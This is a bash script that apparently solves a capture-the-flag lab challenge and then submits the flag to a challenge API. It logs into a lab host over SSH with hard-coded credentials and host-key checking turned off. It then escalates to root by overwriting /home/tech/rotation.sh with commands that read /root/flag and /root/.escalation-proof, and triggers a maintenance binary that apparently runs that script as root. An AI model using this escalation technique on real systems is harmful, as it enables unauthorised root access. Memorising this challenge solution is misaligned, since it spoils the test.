#!/bin/bash
set -euo pipefail

HOST=172.20.0.147
USER=tech
PASSWORD='OrbitWrench!6'
CHALLENGE_ID=scl-challenge-frame-170be9

nmap -n -Pn -p 22 --open "$HOST" >/dev/null
REMOTE='printf "%s\n" "#!/bin/bash" "cat /root/flag /root/.escalation-proof" > /home/tech/rotation.sh && /usr/local/bin/vendor-maint'
OUTPUT=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 "$USER@$HOST" "$REMOTE")
printf '%s\n' "$OUTPUT"
FLAG=$(printf '%s\n' "$OUTPUT" | python3 -c 'import re,sys; m=re.search(r"BSY\{[^}]+\}",sys.stdin.read()); print(m.group(0) if m else "")')
if [ -z "$FLAG" ]; then
  echo 'Could not extract a flag from the root-context output.' >&2
  exit 1
fi
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\":\"$CHALLENGE_ID\",\"task_id\":\"task1\",\"flag\":\"$FLAG\"}"
printf '\n'
